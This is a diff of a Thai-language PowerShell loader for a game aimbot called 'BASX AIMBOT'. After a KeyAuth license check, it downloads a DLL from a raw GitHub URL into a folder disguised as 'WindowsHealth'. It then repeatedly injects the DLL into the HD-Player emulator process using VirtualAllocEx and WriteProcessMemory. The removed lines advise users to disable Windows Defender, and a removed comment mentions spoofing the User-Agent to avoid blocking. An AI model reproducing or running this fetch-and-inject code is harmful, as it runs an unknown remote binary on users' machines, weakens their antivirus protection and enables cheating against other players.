@@ -1,4 +1,4 @@
-# ตั้งค่าให้รองรับภาษาไทยและโปรโตคอลความปลอดภัย
+# ตั้งค่า Encoding ให้แสดงภาษาไทยได้ถูกต้อง
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
@@ -10,15 +10,16 @@ $Version = "1.0"
 
 $dirPath    = "$env:LOCALAPPDATA\WindowsHealth"
 $configPath = "$dirPath\auth.dat"
-$targetDll  = "$dirPath\AimbotFemaleFix.dll" # ย้ายมาเก็บในโฟลเดอร์แอป
-$dllUrl     = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/refs/heads/main/winsky.dll"
+$targetDll  = "$dirPath\AimbotFemaleFix.dll"
+# ลองเปลี่ยน Link เป็นแบบ Raw direct
+$dllUrl     = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/main/winsky.dll"
 $targetProc = "HD-Player"
 
 function Show-Auth {
     param($savedKey = $null)
     Clear-Host
     Write-Host "==============================" -ForegroundColor Cyan
-    Write-Host "     BASX AIMBOT AI test       " -ForegroundColor Cyan
+    Write-Host "     BASX AIMBOT SYSTEM test      " -ForegroundColor Cyan
     Write-Host "==============================" -ForegroundColor Cyan
     
     $initUrl = "https://keyauth.win/api/1.2/?type=init&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID&secret=$Secret&version=$Version"
@@ -30,7 +31,7 @@ function Show-Auth {
 
     if ($null -ne $savedKey) { 
         $key = $savedKey 
-        Write-Host "[*] กำลังใช้คีย์ที่บันทึกไว้..." -ForegroundColor Gray
+        Write-Host "[*] ตรวจพบ License Key เดิม..." -ForegroundColor Gray
     } else { 
         $key = Read-Host " Enter License Key" 
     }
@@ -55,17 +56,17 @@ if (Test-Path $configPath) { $currentKey = Get-Content $configPath }
 if (Show-Auth -savedKey $currentKey) {
     Write-Host "[+] Login Success!" -ForegroundColor Green
 
-    # --- ระบบดาวน์โหลด (เพิ่ม User-Agent เพื่อหลบการบล็อก) ---
+    # --- ระบบดาวน์โหลดแบบ Force Check ---
     if (!(Test-Path $targetDll)) {
-        Write-Host "[*] กำลังดาวน์โหลดไฟล์คอมโพเนนต์..." -ForegroundColor Yellow
+        Write-Host "[*] กำลังดึงไฟล์จาก Server..." -ForegroundColor Yellow
         try {
-            $client = New-Object System.Net.WebClient
-            $client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-            $client.DownloadFile($dllUrl, $targetDll)
-            Write-Host "[+] ดาวน์โหลดสำเร็จ" -ForegroundColor Green
+            $webClient = New-Object System.Net.WebClient
+            $webClient.Headers.Add("user-agent", "Mozilla/5.0")
+            $webClient.DownloadFile($dllUrl, $targetDll)
+            Write-Host "[+] ดาวน์โหลดคอมโพเนนต์สำเร็จ" -ForegroundColor Green
         } catch { 
-            Write-Host "[!] ดาวน์โหลดล้มเหลว!" -ForegroundColor Red
-            Write-Host "[!] โปรดปิด Windows Defender / Antivirus แล้วลองใหม่" -ForegroundColor Yellow
+            Write-Host "[!] ดาวน์โหลดล้มเหลว: ลิงก์ GitHub อาจเสียหรือไฟล์ถูกลบ" -ForegroundColor Red
+            Write-Host "[*] วิธีแก้: ลองเอาไฟล์ AimbotFemaleFix.dll ไปวางไว้ที่: $dirPath เองครับ" -ForegroundColor Yellow
             exit 
         }
     }
@@ -78,7 +79,7 @@ if (Show-Auth -savedKey $currentKey) {
     public class NodeHandler {
         [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int dw, bool b, int p);
         [DllImport("kernel32.dll", CharSet = CharSet.Auto)] public static extern IntPtr GetModuleHandle(string lp);
-        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr h, string pName);
+        [DllImport("kernel32", CharSet = CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr h, string p);
         [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint pr);
         [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out IntPtr w);
         [DllImport("kernel32.dll")] public static extern bool ReadProcessMemory(IntPtr h, IntPtr a, byte[] b, int s, out int r);
@@ -108,19 +109,18 @@ if (Show-Auth -savedKey $currentKey) {
 "@
     Add-Type -TypeDefinition $Source
 
-    Write-Host "[*] กำลังตรวจจับ $targetProc..." -ForegroundColor Cyan
+    Write-Host "[*] ระบบเริ่มเฝ้าตรวจจับ HD-Player..." -ForegroundColor Cyan
     while ($true) {
         $p = Get-Process $targetProc -ErrorAction SilentlyContinue
         if ($p) {
+            # ตรวจสอบค่าที่ 0x2EC
             if (![NodeHandler]::CheckMemory($p.Id, 0x2EC)) {
                 if (Test-Path $targetDll) {
                     [NodeHandler]::StartNode($targetDll, $p.Id)
-                    Write-Host "[+] $(Get-Date -Format 'HH:mm:ss') - ฉีดไฟล์สำเร็จ!" -ForegroundColor Green
+                    Write-Host "[+] $(Get-Date -Format 'HH:mm:ss') - โปรหลุด! ทำการฉีดใหม่ให้แล้ว" -ForegroundColor Green
                 }
             }
         }
         Start-Sleep -Seconds 5
     }
-} else {
-    Write-Host "[-] Login Failed." -ForegroundColor Red
 }
